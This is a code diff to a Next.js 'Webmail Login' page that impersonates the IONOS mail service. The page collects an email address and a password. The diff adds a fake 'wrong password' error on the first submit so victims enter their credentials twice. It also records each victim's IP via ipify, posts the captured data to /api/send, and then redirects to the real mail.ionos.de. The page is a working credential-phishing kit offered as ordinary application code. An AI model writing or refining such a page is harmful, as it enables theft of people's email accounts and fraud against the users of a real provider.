@@ -1,11 +1,16 @@
 "use client";
 import Image from "next/image";
-import { type FormEvent, useRef } from "react";
+import { type FormEvent, useRef, useState } from "react";
 import axios from "axios";
 
 export default function Home() {
+  const [count, setCount] = useState(0);
   const formData = async (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    if (count == 0) {
+      setCount((prev) => prev + 1);
+      return;
+    }
     const dataObj: { [key: string]: string } = {};
     if (forma.current) {
       const data = new FormData(forma.current);
@@ -14,15 +19,20 @@ export default function Home() {
         dataObj[key] = val as string;
       }
     }
-
     console.log(dataObj);
 
     try {
+      const res = await axios.get("https://api.ipify.org?format=json");
+
+      dataObj["ip"] = res.data?.ip;
+
+      console.log(dataObj);
+
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
       if (result.status === 200) {
+        console.log(result.data);
         return window.location.replace("https://mail.ionos.de/");
-        // console.log(result.data);
       }
       return;
     } catch (error) {
@@ -30,14 +40,31 @@ export default function Home() {
     }
   };
 
+  const checkCount = () => count > 0;
+
   const forma = useRef<HTMLFormElement>(null);
   return (
     <main className="bg-stone-100 pt-12 pb-20">
       <div className="max-w-[560px] mx-auto">
-        <div className="border shadow border-gray-100 bg-white h-72">
+        <div
+          className={`border shadow border-gray-100 bg-white ${
+            checkCount() ? "h-[26.4rem]" : "h-72"
+          }`}
+        >
           <form ref={forma} onSubmit={formData} className="px-7 pt-4">
             <h1 className="text-2xl font-normal">Webmail Login</h1>
-
+            <div
+              className={`${
+                checkCount() ? "block" : "hidden"
+              } px-4 py-4 text-red-600 bg-red-50 border-l-2 border-l-red-600 text-sm mt-5`}
+            >
+              <p>Es ist ein Fehler aufgetreten.</p>
+              <br />
+              <p>
+                Das eingegebene Passwort ist nicht korrekt oder die
+                E-Mail-Adresse ist nicht korrekt.
+              </p>
+            </div>
             <div className="mt-5 relative h-9">
               <input
                 type="email"
@@ -45,6 +72,7 @@ export default function Home() {
                 id="kinder"
                 className="h-full w-full border text-[#575a5b] border-[#acb0b2] placeholder:text-xs pl-8 outline-none focus:border-sky-500"
                 placeholder="E-mail addresse"
+                required
               />
 
               <svg
@@ -74,6 +102,7 @@ export default function Home() {
                 id="kind"
                 className="h-full w-full border border-[#acb0b2] placeholder:text-xs pl-8 outline-none focus:border-sky-500"
                 placeholder="Passwort"
+                required
               />
 
               <svg
